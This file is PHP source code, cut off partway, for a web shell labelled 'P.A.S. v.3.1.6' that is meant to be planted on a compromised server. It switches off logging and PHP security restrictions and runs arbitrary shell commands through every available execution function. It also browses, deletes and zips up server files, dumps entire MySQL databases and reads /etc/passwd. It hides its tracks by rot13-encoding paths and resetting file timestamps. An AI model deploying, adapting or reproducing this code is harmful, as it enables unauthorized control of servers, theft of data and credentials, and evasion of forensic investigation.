<?php
@ini_set('log_errors_max_len', 0);
@ini_restore('log_errors');
@ini_restore('error_log');
@ini_restore('error_reporting');
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@ini_set('error_reporting', NULL);
@error_reporting(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(TRUE);
@ini_set('memory_limit', '1000M');
@ini_set('file_uploads', 1);
@ini_restore('magic_quotes_runtime');
@ini_restore('magic_quotes_sybase');
@ini_set('magic_quotes_gpc', 0);
@ini_set('magic_quotes_runtime', 0);
@ini_set('magic_quotes_sybase', 0);
@ini_restore('safe_mode');
@ini_restore('open_basedir');
@ini_restore('safe_mode_exec_dir');
@ini_set('safe_mode', 0);
@ini_set('open_basedir', NULL);
@ini_set('safe_mode_exec_dir', '');
@ini_restore('disable_function');
@ini_set('disable_function', '');
function escHTML($v)
{
	return str_replace(array('&', '"', '<', '>'), array('&amp;', '&quot;', '&lt;', '&gt;'), $v);
}
function ssa($a)
{
	foreach ($a as $k => $v) if (is_array($v)) $a[$k] = ssa($v);
	else $a[$k] = stripslashes($v);
	return ($a);
}
function bname($p)
{
	$p = explode(DIRECTORY_SEPARATOR, $p);
	return end($p);
}
if (@get_magic_quotes_gpc())
	$_POST = ssa($_POST);
class zc
{
	var $cr = '';
	var $fc = 0;
	var $co = 0;
	var $msm = 5242880;
	var $msd = 52428800;
	var $ig;
	var $fs;

	function __construct($n = 'archive')
	{
		$this->ig = @function_exists('gzopen');
		header('Content-type: application/x-zip');
		header('Content-Disposition: attachment;
  filename=' . $n . '_' . $_SERVER['HTTP_HOST'] . '_' . date('Y-m-d_H.i') . '.zip');
		header('Content-Transfer-Encoding: binary');
		header('Last-Modified: ' . @gmdate('D, d M Y H:i:s') . ' GMT');
	}

	function add($a)
	{
		foreach ($a as $v) if (@is_readable($v)) {
			if (@is_dir($v)) $this->ad($v, $v);
			elseif (@is_file($v)) $this->af($v, $v);
		}
	}

	function ad($p, $n)
	{
		if ($d = @opendir($p)) {
			while (FALSE !== ($v = @readdir($d))) if ($v != '.' && $v != '..' && @is_readable($p . DIRECTORY_SEPARATOR . $v)) {
				if (@is_dir($p . DIRECTORY_SEPARATOR . $v)) $this->ad($p . DIRECTORY_SEPARATOR . $v, $n . '/' . $v);
				elseif (@is_file($p . DIRECTORY_SEPARATOR . $v)) $this->af($p . DIRECTORY_SEPARATOR . $v, $n . '/' . $v);
			}
			@closedir($d);
		}
	}

	function af($p, $n)
	{
		$s = @stat($p);
		if (!$s) return;
		$h1 = "\x14\x00\x08\x00" . (($this->ig && ($s[7] <= $this->msd)) ? "\x08" : "\x00") . "\x00" . $this->pd($s[9]);
		$h2 = pack('v', strlen($n)) . "\x00\x00";
		echo "\x50\x4b\x03\x04", $h1, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", $h2, $n;
		if ($this->ig && ($s[7] <= $this->msm)) {
			$b = @file_get_contents($p);
			$crc = pack('V', crc32($b));
			$b = gzdeflate($b);
			$cs = strlen($b);
			echo $b;
		} elseif ($this->ig && ($s[7] <= $this->msd)) {
			$t = @tempnam('/tmp/', '');
			$f = @fopen($p, 'rb');
			$g = @gzopen($t, 'wb');
			while (!feof($f)) @gzwrite($g, fread($f, 1048576));
			@gzclose($g);
			@fclose($f);
			$f = @fopen($t, 'rb');
			@fseek($f, 10);
			while (!feof($f)) echo fread($f, 1048576);
			@fseek($f, -8, SEEK_END);
			$crc = fread($f, 4);
			@fclose($f);
			$cs = @filesize($t) - 10;
			@unlink($t);
		} else {
			$cs = 0;
			$crc = false;
			$f = @fopen($p, 'rb');
			while (!feof($f)) {
				$b = fread($f, 1048576);
				$l = strlen($b);
				$cc = crc32($b);
				$cs += $l;
				echo $b;
				$b = '';
				if ($crc) $crc = $this->crc32c($crc, $cc, $l);
				else $crc = $cc;
			}
			@fclose($f);
			$crc = pack('V', $crc);
		}
		$h3 = $crc . pack('V', $cs) . pack('V', $s[7]);
		echo "\x50\x4b\x07\x08", $h3;
		$this->cr .= "\x50\x4b\x01\x02\x00\x00" . $h1 . $h3 . $h2 . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . pack('V', $this->co) . $n;
		$this->co += $cs + 46 + strlen($n);
		++$this->fc;
	}

	function of($n)
	{
		$this->fs['n'] = $n;
		$h = "\x14\x00\x08\x00\x00\x00" . $this->pd(time());
		$this->cr .= "\x50\x4b\x01\x02\x00\x00" . $h;
		$this->fs['h2'] = pack('v', strlen($n)) . "\x00\x00";
		echo "\x50\x4b\x03\x04", $h, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", $this->fs['h2'], $n;
		$this->fs['cs'] = 0;
		$this->fs['crc'] = false;
	}

	function wf($d)
	{
		$l = strlen($d);
		$cc = crc32($d);
		$this->fs['cs'] += $l;
		if ($this->fs['crc']) $this->fs['crc'] = $this->crc32c($this->fs['crc'], $cc, $l);
		else $this->fs['crc'] = $cc;
		echo $d;
	}

	function cf()
	{
		$h = pack('V', $this->fs['crc']) . pack('V', $this->fs['cs']) . pack('V', $this->fs['cs']);
		echo "\x50\x4b\x07\x08", $h;
		$this->cr .= $h . $this->fs['h2'] . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . pack('V', $this->co) . $this->fs['n'];
		$this->co += $this->fs['cs'] + 46 + strlen($this->fs['n']);
		$this->fs = array();
		++$this->fc;
	}

	function pd($t)
	{
		$t = getdate($t);
		return pack('v', ($t['hours'] << 11) + ($t['minutes'] << 5) + $t['seconds'] / 2) . pack('v', (($t['year'] - 1980) << 9) + ($t['mon'] << 5) + $t['mday']);
	}

	function cl()
	{
		$c = "Archive created by P.A.S. v.3.1.6\nHost: : " . $_SERVER['HTTP_HOST'] . "\nDate : " . date('d-m-Y');
		$this->fc = pack('v', $this->fc);
		echo $this->cr, "\x50\x4b\x05\x06\x00\x00\x00\x00", $this->fc, $this->fc, pack('V', strlen($this->cr)), pack('V', $this->co), pack('v', strlen($c)), $c;
	}

	function crc32c($c1, $c2, $l)
	{
		$o[0] = 0xedb88320;
		$r = 1;
		for ($i = 1;
			 $i < 32;
			 ++$i) {
			$o[$i] = $r;
			$r <<= 1;
		}
		$this->cgms($e, $o);
		$this->cgms($o, $e);
		do {
			$this->cgms($e, $o);
			if ($l & 1) $c1 = $this->cgmt($e, $c1);
			$l >>= 1;
			if ($l == 0) break;
			$this->cgms($o, $e);
			if ($l & 1) $c1 = $this->cgmt($o, $c1);
			$l >>= 1;
		} while ($l != 0);
		return $c1 ^ $c2;
	}

	function cgms(&$s, &$m)
	{
		for ($i = 0;
			 $i < 32;
			 ++$i) $s[$i] = $this->cgmt($m, $m[$i]);
	}

	function cgmt(&$m, $v)
	{
		$s = $i = 0;
		while ($v) {
			if ($v & 1) $s ^= $m[$i];
			$v = ($v >> 1) & 0x7FFFFFFF;
			++$i;
		}
		return $s;
	}
}
class sc
{
	var $tp = '';
	var $cl = NULL;
	var $cs = '';
	var $rs = NULL;
	var $sv = NULL;

	function __construct($tp)
	{
		$this->tp = $tp;
	}

	function cn($ha, $hp, $un, $up)
	{
		switch ($this->tp) {
			case 'mysqli':
				$p = empty($hp) ? '' : ':' . $hp;
				if ($this->cl = new mysqli($ha . $p, $un, $up)) {
					$this->cl->set_charset('utf8');
					$this->sv = @mysqli_get_server_info($this->cl);
				}
				break;
		}
		if ($this->cl) return TRUE;
		else return FALSE;
	}

	function sd($n)
	{
		switch ($this->tp) {
			case 'mysqli':
				$this->cl->select_db($n);
				break;
		}
	}

	function q($q)
	{
		switch ($this->tp) {
			case 'mysqli':
				$this->rs = $this->cl->query($q);
				break;
		}
		return $this->rs;
	}

	function ql($d, $t, $p, $l)
	{
		switch ($this->tp) {
			case 'mysqli':
				$p = ($p - 1) * $l;
				$q = 'SELECT * FROM `' . $d . '`.`' . $t . '` LIMIT ' . $p . ',' . $l;
				break;
		}
		return $q;
	}

	function ld()
	{
		switch ($this->tp) {
			case 'mysqli':
				$this->rs = $this->cl->query('SHOW DATABASES');
				if ($this->rs->fetch_row() == 0 && $this->sv[0] > '4') $this->rs = $this->cl->query('SELECT schema_name FROM information_schema.schemata');
				break;
		}
		return $this->rs;
	}

	function lt($n)
	{
		switch ($this->tp) {
			case 'mysqli':
				$this->rs = $this->cl->query('SHOW TABLES FROM `' . $n . '`');
				if ($this->rs->fetch_row() == 0 && $this->sv[0] > '4') $this->rs = $this->cl->query("SELECT table_name FROM information_schema.tables WHERE table_schema='" . $n . "'");
				break;
		}
		return $this->rs;
	}

	function ts($d, $t)
	{
		switch ($this->tp) {
			case 'mysqli':
				if ($this->sv[0] > '4' && $r = $this->cl->query("SELECT table_rows FROM information_schema.tables WHERE table_schema='" . $d . "' AND table_name='" . $t . "'")) return (int)$this->fv(0, $r);
				else {
					$r = $this->cl->query('SELECT COUNT(*) FROM `' . $d . '`.`' . $t . '`');
					return (int)$this->fv(0, $r);
				}
				break;
		}
	}

	function fv($o, &$r = NULL)
	{
		$out = null;
	
		if ($r == NULL) $r = &$this->rs;
		switch($this->tp){
			case 'mysqli':
				$r->data_seek($o);
				$out = $r->fetch_row();
				$out = isset($out[0]) ? $out[0] : null;
				break;
		}
		return $out;
	}

	function fn($o)
	{
		$out = null;
		switch($this->tp){
			case 'mysqli':
				$out = $this->rs->fetch_assoc();
				$out = is_array($out) ? array_keys($out) : array();
				$out = isset($out[$o]) ? $out[$o] : null;
				$this->rs->data_seek(0);
				break;
		}
		return $out;
	}

	function fr()
	{
		$out = null;
		switch($this->tp){
			case 'mysqli':
				$out = $this->rs->fetch_row();
				break;
		}
		return $out;
	}

	function e()
	{
		switch ($this->tp) {
			case 'mysqli':
				return $this->cl->error;
				break;
		}
	}

	function dt($d, $t, &$f)
	{
		switch ($this->tp) {
			case 'mysqli':
				$f->wf("\n-- \n-- `" . $d . "`.`" . $t . "`\n-- \nDROP TABLE IF EXISTS `" . $t . "`;
 \n");
				$this->cl->query('SET SQL_QUOTE_SHOW_CREATE=1');
				$q = $this->cl->query('SHOW CREATE TABLE `' . $d . '`.`' . $t . '`');
				$q = $q->fetch_row();
				$f->wf(preg_replace('/(default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP|DEFAULT CHARSET=\w+|COLLATE=\w+|character set \w+|collate \w+)/i', '/*!40101 \\1 */', $q[1]) . ";
 \n\n");
				$q = $this->cl->query('SELECT * FROM `' . $d . '`.`' . $t . '`', MYSQLI_USE_RESULT);
				if ($r = $q->fetch_row()) {
					$f->wf('INSERT INTO `' . $t . '` VALUES ');
					$r = $this->escape($r);
					$f->wf("\n('" . implode("', '", $r) . "')");
					while ($r = $q->fetch_row()) {
						$r = $this->escape($r);
						$f->wf(",\n('" . implode("', '", $r) . "')");
					}
					$f->wf(";
 \n");
				}
				break;
		}
	}
	function escape($data){
		switch($this->tp){
			case 'mysqli':
				if(is_array($data)){
					foreach($data as &$row){
						$row = $this->cl->escape_string($row);
					}
				}else{
					$data = $this->cl->escape_string($data);
				}
				break;
		}
		return $data;
	}
	function cl()
	{
		$f = $this->tp . '_close';
		@$f($this->cl);
	}
}
if (isset($_POST['fdw']) || isset($_POST['fdwa'])) {
	@session_write_close();
	if (isset($_POST['fdwa']) && !empty($_POST['fc'])) {
		$_POST['fc'] = array_map('str_rot13', $_POST['fc']);
		$z = new zc();
		$z->add($_POST['fc']);
		$z->cl();
		die();
	} elseif (isset($_POST['fdw'])) {
		$_POST['fdw'] = str_rot13($_POST['fdw']);
		header('Content-type: multipart/octet-stream');
		header('Content-Disposition: attachment;
  filename=' . bname($_POST['fdw']));
		header('Content-Transfer-Encoding: binary');
		header('Accept-Ranges: bytes');
		header('Content-Length: ' . @filesize($_POST['fdw']));
		header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
		@readfile($_POST['fdw']);
		die();
	}
}
if (isset($_POST['sdd']) && !empty($_POST['cd'])) {
	$z = new zc('SQL_dump');
	@session_start();
	$c = $_SESSION['DB'];
	@session_write_close();
	$s = new sc($c['tp']);
	if ($s->cn($c['ha'], $c['hp'], $c['un'], $c['up'])) {
		foreach ($_POST['cd'] as $v) {
			$z->of($v . '.sql');
			$z->wf('-- -------------------------------- --' . "\n" . '-- [  SQL Dump created by P.A.S.  ] --' . "\n" . '-- [' . str_pad($_SERVER['HTTP_HOST'], 30, ' ', STR_PAD_BOTH) . '] --' . "\n" . '-- [          ' . date('Y/m/d') . '          ] --' . "\n" . '-- -------------------------------- --' . "\n");
			$s->lt($v);
			$i = 0;
			while ($t = $s->fv($i++)) $s->dt($v, $t, $z);
			$z->cf();
		}
		$s->cl();
	}
	$z->cl();
	die();
}
if (isset($_POST['sdt']) && !empty($_POST['ct'])) {
	class ce
	{
		function me()
		{
		}

		function wf($s)
		{
			echo $s;
		}
	}

	$e = new ce();
	@session_start();
	$c = $_SESSION['DB'];
	@session_write_close();
	header('Content-type: multipart/octet-stream');
	header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_[' . $c['db'] . ']_' . date('Y-m-d_H.i') . '.sql');
	header('Content-Transfer-Encoding: binary');
	header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
	echo '-- -------------------------------- --', "\n", '-- [  SQL Dump created by P.A.S.  ] --', "\n", '-- [', str_pad($_SERVER['HTTP_HOST'], 30, ' ', STR_PAD_BOTH), '] --', "\n", '-- [          ', date('Y/m/d'), '          ] --', "\n", '-- -------------------------------- --', "\n";
	$s = new sc($c['tp']);
	if ($s->cn($c['ha'], $c['hp'], $c['un'], $c['up'])) {
		foreach ($_POST['ct'] as $v) $s->dt($c['db'], $v, $e);
		$s->cl();
	}
	die();
}
function mt()
{
	list($usec, $sec) = explode(' ', microtime());
	return ((float)$usec + (float)$sec);
}
define('ST', mt());
define('IW', strtolower(substr(PHP_OS, 0, 3)) == 'win');
@session_start();
if (!empty($_POST['cs'])) $_SESSION['CS'] = $_POST['cs'];
elseif (empty($_SESSION['CS'])) $_SESSION['CS'] = 'UTF-8';
if (empty($_SESSION['CP']) || isset($_POST['gh'])) $_SESSION['CP'] = @dirname($_SERVER['SCRIPT_FILENAME']);
elseif (isset($_POST['fp']) || isset($_POST['fpr'])) {
	if (isset($_POST['fpr'])) $_POST['fp'] = str_rot13($_POST['fpr']);
	if (@is_file($_POST['fp'])) {
		$_SESSION['CP'] = @dirname($_POST['fp']);
		$_POST['fef'] = $_POST['fp'];
	} elseif (@is_dir($_POST['fp'])) $_SESSION['CP'] = $_POST['fp'];
	$_SESSION['CP'] = @realpath($_SESSION['CP']);
}
if (IW) $_SESSION['CP'] = str_replace('\\', '/', $_SESSION['CP']);
if (substr($_SESSION['CP'], -1) != '/') $_SESSION['CP'] .= '/';
@chdir($_SESSION['CP']);
define('PE', @function_exists('posix_geteuid'));
$ui = array();
$gi = array();
if (!PE && !IW) {
	if (@is_readable('/etc/passwd')) {
		$a = file('/etc/passwd');
		foreach ($a as $v) {
			$v = explode(':', $v);
			$ui[$v[2]] = $v[0];
		}
	}
	if (@is_readable('/etc/group')) {
		$a = file('/etc/group');
		foreach ($a as $v) {
			$v = explode(':', $v);
			$gi[$v[2]] = $v[0];
		}
	}
}
function sm($m, $t)
{
	echo '<fieldset class="' . $t . '">', escHTML($m), '</fieldset>';
}
function ctf($c)
{
	$t = @tempnam('/tmp/', '');
	$f = @fopen($t, 'w');
	@fwrite($f, $c);
	@fclose($f);
	return $t;
}
function se($c)
{
	@ob_start();
	if ($r = @`echo 1`) echo @`$c`;
	elseif (@function_exists('exec')) {
		@exec($c, $r);
		echo @implode("\n", $r);
	} elseif (@function_exists('system')) @system($c);
	elseif (@function_exists('shell_exec')) echo @shell_exec($c);
	elseif (@function_exists('passthru')) @passthru($c);
	elseif (@is_resource($f = @popen($c, 'r'))) {
		while (!feof($f)) echo fread($f, 1024);
		@pclose($f);
	} elseif (@is_resource($f = @proc_open($c, array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'a')), $p))) {
		echo @stream_get_contents($p[1]);
		@proc_close($f);
	} elseif (@function_exists('pcntl_exec')) @pcntl_exec('/bin/sh', array('-c', $c));
	elseif (@function_exists('expect_popen') && is_resource($f = @expect_popen($c))) {
		while (!feof($f)) echo fread($f, 1024);
		@fclose($f);
	} elseif (@is_resource($f = @fopen('expect://' . $c, 'r'))) {
		while (!feof($f)) echo fread($f, 1024);
		@fclose($f);
	}
	echo escHTML(@ob_get_clean());
}
@header("Content-Type: text/html; charset=" . $_SESSION['CS']);
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"/>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html;
  charset=<?php echo $_SESSION['CS'];
	?>"/>
	<title><?php echo escHTML($_SERVER['SERVER_NAME']);
		?></title>
	<style> html {
			margin: 0;
			padding: 0;
			background-color: #4a4a4a
		}

		body {
			margin: 0px auto;
			padding: 0;
			width: 1000px;
			font: normal 11px Verdana;
			color: #bfbfbf;
			border: 1px solid #7c7c7c;
			background: #000000
		}

		a, a:hover, a:visited {
			color: #aaaaaa;
			text-decoration: none
		}

		fieldset {
			margin: 5px 3px;
			padding: 3px 5px;
			font-weight: bold;
			border: 1px solid #444444;
			background: #202020
		}

		legend {
			padding: 3px 10px;
			min-width: 90px;
			border: 1px solid #444444;
			background: #202020
		}

		fieldset.head {
			margin-top: 3px
		}

		fieldset.menu {
			padding: 2px 0px;
			text-align: center
		}

		fieldset.nav {
			padding: 3px 5px
		}

		fieldset.e, fieldset.i {
			margin: 8px;
			padding: 6px 0px 6px 0px;
			text-align: center;
			background: #3f3f3f
		}

		fieldset.e {
			border-color: #ee0000
		}

		fieldset.i {
			border-color: #0000ee
		}

		table {
			margin: 0;
			padding: 0;
			table-layout: fixed;
			font: normal 11px Verdana;
			border-collapse: collapse
		}

		table.head {
			border: none
		}

		table.head th {
			text-align: left
		}

		table.head th, table.head td {
			padding: 3px 0px
		}

		table.head td b {
			color: #cfcfcf
		}

		table.list {
			margin-top: 5px;
			margin-bottom: 20px;
			border: 1px solid #000000;
			background: #202020
		}

		table.list th {
			padding: 3px 10px
		}

		table.list td {
			padding: 3px 5px
		}

		table.list tr.ok {
			color: green
		}

		table.list tr.fail {
			display: none
		}

		#listf {
			margin: 5px;
			width: 990px;
			background: #202020
		}

		#listf td, table.form td {
			padding: 4px 3px
		}

		#listf td div {
			display: inline;
			color: #555
		}

		table.list tr:hover, #listf tr:hover, table.lists tr:hover td, table.listr tr:hover td {
			background: #333333
		}

		table.list th, #listf th, table.listr th {
			color: #d0d0d0;
			border: 1px solid #000000;
			background: #505050
		}

		table.list td, #listf td, table.listr td {
			border: 1px solid #000000
		}

		table.listp td {
			text-align: center
		}

		table.listp th {
			padding: 2px 5px
		}

		#listf th, table.lists th {
			padding: 3px 0px;
			border: 1px solid #707070
		}

		table.lists, table.listr {
			width: 100%;
			background: #202020
		}

		table.lists td {
			padding: 2px 0px;
			text-align: center;
			border: 1px solid #000000
		}

		table.lists td div {
			display: none;
			position: absolute;
			margin-left: 213px;
			margin-top: -18px;
			padding: 1px 5px;
			text-align: left;
			background: #404040;
			border: 1px solid #707070
		}

		table.lists tr:hover td div {
			display: block
		}

		table.listr {
			table-layout: auto
		}

		table.listr th {
			padding: 2px 4px
		}

		table.listr td {
			padding: 4px
		}

		table.listr td p {
			max-height: 100px;
			overflow-y: auto
		}

		form {
			margin: 0px;
			padding: 2px 0px
		}

		button, input[type=submit], input[type=text], input[type=file], select, textarea, pre {
			color: #aaaaaa;
			border: 1px solid #7c7c7c;
			background: #444444
		}

		button:hover, input[type=submit]:hover, input[type=text]:hover, select:hover, textarea:hover {
			color: #eeeeee;
			border-color: #a0a0a0
		}

		button, input[type=submit] {
			margin: 0;
			padding: 1px 10px;
			font: normal 11px Verdana;
			white-space: pre;
		}

		input[type=text], input[type=file], select {
			margin: 0px;
			padding: 1px;
			font: normal 11px Verdana
		}

		input[type=text]:focus, textarea:focus {
			color: #eeeeee;
			background: #000000
		}

		input[type=checkbox] {
			margin: 0;
			border: 1px solid #000000;
			background: #3f3f3f
		}

		textarea {
			margin: 2px 5px;
			padding: 2px 3px;
			width: 990px;
			height: 300px
		}

		button::-moz-focus-inner, input[type=submit]::-moz-focus-inner {
			margin: 0;
			padding: 0px;
			border: 0
		}

		fieldset.menu button {
			padding: 2px 10px 3px 10px
		}

		fieldset.nav form {
			padding: 0
		}

		fieldset.pag form {
			display: inline
		}

		fieldset.footer form {
			margin: 0;
			padding: 0
		}

		#listf button[type=submit] {
			margin: 0px 2px;
			padding: 0;
			font: normal 11px Verdana;
			border: none;
			background: none
		}

		#listf th input[type=submit] {
			margin: 5px 5px 2px 1px;
			padding-bottom: 2px;
			background: #000000
		}

		table.lists td input[type=submit] {
			width: 100%;
			text-align: left;
			border: none;
			background: none
		}

		table.lists th input[type=submit] {
			margin: 0;
			padding: 0px 10px
		}

		pre {
			margin: 5px;
			padding: 1px 2px;
			height: 310px;
			overflow: auto;
			text-align: left;
			white-space: pre;
			font: normal 12px "Courier New"
		}

		div.ntwrk {
			float: left;
			margin: 0;
			padding: 0;
			width: 250px
		}

		div.ntwrk fieldset {
			margin: 10px 10px 25px 10px
		}

		div.ntwrk fieldset div {
			margin: 8px 0px 5px 0px;
			font-weight: normal
		}

		button.sb {
			margin: 0;
			padding: 0 1px 0 0;
			font-size: 12px;
			border: 0;
			background: none;
			cursor: pointer;
		}

		#listf td:nth-of-type(2):hover {
			color: #eee;
		}</style>
	<script>function ca(v, f) {
			var cb = document.getElementById(f);
			for (i = 1, n = cb.elements.length;
				 i < n;
				 i++) {
				if (cb.elements[i].type == 'checkbox') cb.elements[i].checked = v;
			}
		}</script>
</head>
<body>
<fieldset class="head">
	<table class="head">
		<tr>
			<th style="width:125px">Server address :</th>
			<td><?php if (!empty($_SERVER['SERVER_NAME'])) echo ($_SERVER['HTTP_HOST'] == $_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : $_SERVER['HTTP_HOST'] . ' on ' . $_SERVER['SERVER_NAME'];
				else echo $_SERVER['HTTP_HOST'];
				$i = @gethostbyname($_SERVER['HTTP_HOST']);
				if (!empty($_SERVER['SERVER_ADDR'])) echo ' (', ($_SERVER['SERVER_ADDR'] == $i) ? $_SERVER['SERVER_ADDR'] : $i . ', ' . $_SERVER['SERVER_ADDR'], ')';
				elseif (!empty($i)) echo ' (', $i, ')';
				echo ' / ', @php_uname('n');
				?></td>
		</tr>
		<tr>
			<th>Server OS :</th>
			<td><?php echo IW ? @file_get_contents('/etc/issue.net') . ' ' : '', @php_uname('s'), ' ', @php_uname('r'), ' ', @php_uname('v'), ' ', @php_uname('m');
				?></td>
		</tr>
		<tr>
			<th>Server software :</th>
			<td><?php if (!strpos($_SERVER['SERVER_SOFTWARE'], 'PHP/')) echo '<b>PHP</b>/', @phpversion(), ' ';
				echo preg_replace('#([^ ]*)/#U', '<b>$1</b>/', $_SERVER['SERVER_SOFTWARE']);
				if (@function_exists('curl_init')) echo ' <b>cURL</b>';
				if (@function_exists('mysqli_connect')) echo ' <b>MySQL</b>/' . @mysqli_get_client_info();
				?></td>
		</tr>
		<tr>
			<th>User info :</th>
			<td><?php if (PE) {
					$u = @posix_getpwuid(@posix_geteuid());
					$g = @posix_getgrgid(@posix_getegid());
					$i = array($u['uid'], $u['name'], $g['gid'], $g['name']);
				} else {
					$i = @getmygid();
					$i = array(@getmyuid(), @get_current_user(), $i, empty($gi[$i]) ? $i : $gi[$i]);
				}
				echo 'uid=', $i[0], '(', $i[1], ') gid=', $i[2], '(', $i[3], ')';
				?></td>
		</tr><?php if (@ini_get('safe_mode')) echo '<tr><th>SafeMode :</th><th style="color:#FF4500">ON</th></tr>';
		if (is_string($d = @ini_get('open_basedir')) && trim($d) !== '') echo '<tr><th>OpenBaseDir :</th><td style="color:#FF4500">', escHTML($d), '</td></tr>';
		if (is_string($d = @ini_get('disable_functions')) && trim($d) !== '') echo '<tr><th>Disable functions :&nbsp;
 </th><td style="color:#FF4500">', escHTML(str_replace(',', ', ', $d)), '</td></tr>';
		?></table>
</fieldset>
<fieldset class="menu">
	<form action="" method="post">
		<button type="submit" name="fe">Explorer</button>
		<button type="submit" name="fs">Searcher</button>
		<button type="submit" name="se">SQL-client</button>
		<button type="submit" name="nt">Network Tools</button>
		<button type="submit" name="sc">CMD</button>
		<button type="submit" name="si">Server info</button>
	</form>
</fieldset>
<fieldset class="nav">
	<table width="100%">
		<tr>
			<th width="50px" align="left">Go to :</th><?php $a = range('a', 'z');
			foreach ($a as $d) if (@is_dir($d . ':')) echo '<form action="" method="post"><td width="20px"><button type="submit" name="fp" value="' . $d . ':" style="padding:0;
  border:none;
  background:none;
 ">' . strtoupper($d) . ':</button></td><input type="hidden" name="fe"/></form>';
			?>
			<form action="" method="post">
				<td><input type="text" name="fp" value="<?php echo escHTML($_SESSION['CP']);
					?>" style="width:100%"/></td>
				<td width="30px" align="right"><input type="submit" value="&gt;
 "/></td>
				<input type="hidden" name="fe"/></form>
			<form action="" method="post">
				<td width="60px" align="right"><input type="submit" name="gh" value="Home"/></td>
				<input type="hidden" name="fe"/></form>
		</tr>
	</table>
</fieldset>
<fieldset class="nav">
	<form action="" method="post"><input type="hidden" name="fe"/><b>Jump :</b>&nbsp;
		<?php $k = '';
		$v = explode('/', rtrim($_SESSION['CP'], '/'));
		foreach ($v as $i) {
			$k .= $i . '/';
			echo '<button type="submit"name="fp"class="sb"value="', escHTML($k), '">', escHTML($i), '/</button>';
		}?></form>
</fieldset><?php if (isset($_POST['fe']) || isset($_POST['fs'])){
	if (!empty($_POST['fd']) || isset($_POST['fda'])) {
		function dd($p)
		{
			$p = @realpath($p);
			$d = @opendir($p);
			while (FALSE !== ($f = @readdir($d))) if ($f != '.' && $f != '..') {
				if (is_dir($p . DIRECTORY_SEPARATOR . $f)) dd($p . DIRECTORY_SEPARATOR . $f);
				else @unlink($p . DIRECTORY_SEPARATOR . $f);
			}
			@closedir($d);
			@rmdir($p);
		}

		function dfd($p)
		{
			$p = str_rot13($p);
			$s = @stat(dirname($p));
			if (@is_dir($p)) dd($p);
			else @unlink($p);
			@touch(dirname($p), $s[9], $s[8]);
		}

		if (isset($_POST['fda']) && !empty($_POST['fc'])) foreach ($_POST['fc'] as $f) dfd($f);
		elseif (!empty($_POST['fd'])) dfd($_POST['fd']);
	} elseif (!empty($_POST['fm']) || isset($_POST['fma'])) {
		function aml($p)
		{
			$p = str_rot13($p);
			if (!empty($_SESSION['MO'][$p])) unset($_SESSION['MO'][$p]);
			else {
				if (!empty($_SESSION['CO'][$p])) unset($_SESSION['CO'][$p]);
				$_SESSION['MO'][$p] = 1;
			}
		}

		if (isset($_POST['fma']) && !empty($_POST['fc'])) foreach ($_POST['fc'] as $f) aml($f);
		elseif (!empty($_POST['fm'])) aml($_POST['fm']);
	} elseif (!empty($_POST['fcf']) || isset($_POST['fca'])) {
		function acl($p)
		{
			$p = str_rot13($p);
			if (!empty($_SESSION['CO'][$p])) unset($_SESSION['CO'][$p]);
			else {
				if (!empty($_SESSION['MO'][$p])) unset($_SESSION['MO'][$p]);
				$_SESSION['CO'][$p] = 1;
			}
		}

		if (isset($_POST['fca']) && !empty($_POST['fc'])) foreach ($_POST['fc'] as $f) acl($f);
		elseif (!empty($_POST['fcf'])) acl($_POST['fcf']);
	} elseif (isset($_POST['fbc'])) unset($_SESSION['MO'], $_SESSION['CO']);
	elseif (isset($_POST['fbp'])) {
		function cd($p, $d)
		{
			$p = @realpath($p);
			$sd = @stat($d);
			$n = $d . DIRECTORY_SEPARATOR . bname($p);
			if ((@is_dir($n) && @is_writable($n)) || @mkdir($n)) {
				if ($h = @opendir($p)) {
					$s = @stat($n);
					while (FALSE !== ($f = @readdir($h))) if ($f != '.' && $f != '..') {
						if (@is_dir($p . DIRECTORY_SEPARATOR . $f)) cd($p . DIRECTORY_SEPARATOR . $f, $n);
						else {
							$sf = @stat($p . DIRECTORY_SEPARATOR . $f);
							@copy($p . DIRECTORY_SEPARATOR . $f, $n . DIRECTORY_SEPARATOR . $f);
							@touch($p . DIRECTORY_SEPARATOR . $f, $sf[9], $sf[8]);
						}
					}
					@closedir($h);
					@touch($n, $s[9], $s[8]);
				}
				@touch($d, $sd[9], $sd[8]);
			}
		}

		$s = @stat($_SESSION['CP']);
		if (!empty($_SESSION['MO'])) {
			foreach ($_SESSION['MO'] as $v => $n) {
				$t = $_SESSION['CP'] . bname($v);
				$td = dirname($v);
				$st = @stat($td);
				@rename($v, $t);
				@touch($t, $s[9], $s[8]);
				@touch($td, $st[9], $st[8]);
			}
			unset($_SESSION['MO']);
		}
		if (!empty($_SESSION['CO'])) {
			foreach ($_SESSION['CO'] as $v => $n) {
				if (@is_dir($v)) cd($v, $_SESSION['CP']);
				else {
					$t = $_SESSION['CP'] . bname($v);
					$sv = @stat($v);
					@copy($v, $t);
					@touch($t, $sv[9], $sv[8]);
				}
			}
			unset($_SESSION['CO']);
		}
		@touch($_SESSION['CP'], $s[9], $s[8]);
	} elseif (!empty($_POST['frs']) && !empty($_POST['frd'])) {
		$ts = @stat(dirname($_POST['frs']));
		$td = @stat(dirname($_POST['frd']));
		$to = @stat($_POST['frs']);
		if (@rename($_POST['frs'], $_POST['frd'])) {
			@touch($_POST['frd'], $to[9], $to[8]);
			@touch(dirname($_POST['frs']), $ts[9], $ts[8]);
			@touch(dirname($_POST['frd']), $td[9], $td[8]);
			sm('Rename successfully. Congratulations!', 'i');
		} else sm('Can\'t rename. Sorry.', 'e');
	} elseif (!empty($_POST['fn'])) {
		$s = @stat(dirname($_POST['fn']));
		if ($_POST['t'] == 'f') {
			if ($fh = @fopen($_POST['fn'], 'w')) {
				@fclose($fh);
